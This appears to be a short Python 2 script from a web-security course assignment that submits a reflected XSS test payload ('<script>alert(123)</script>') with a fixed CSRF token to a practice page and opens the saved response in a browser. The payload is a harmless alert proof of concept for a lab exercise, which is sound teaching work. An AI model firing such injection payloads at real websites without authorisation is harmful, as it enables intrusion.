import urllib, urllib2, cookielib
import webbrowser
import os.path
# do POST with message to case09
case09url= 'http://www.wsb.com/Assignment2/case09.php'
# prepare the value of the form which includes the attack payload
payload = dict(data='<script>alert(123)</script>', csrf_token='wkjdb-iouer-234k3-wklu3k')
#submit the form
req = urllib2.Request(case09url, urllib.urlencode(payload))
rsp = urllib2.urlopen(req)
#read the return result
content = rsp.read()
f = open('rsp.html', 'w')
f.write(content)
#path will set to the current path
path = os.path.realpath("rsp.html")
url = "file://" + path
#open in new window to show the POST content
webbrowser.open(url,new=2)
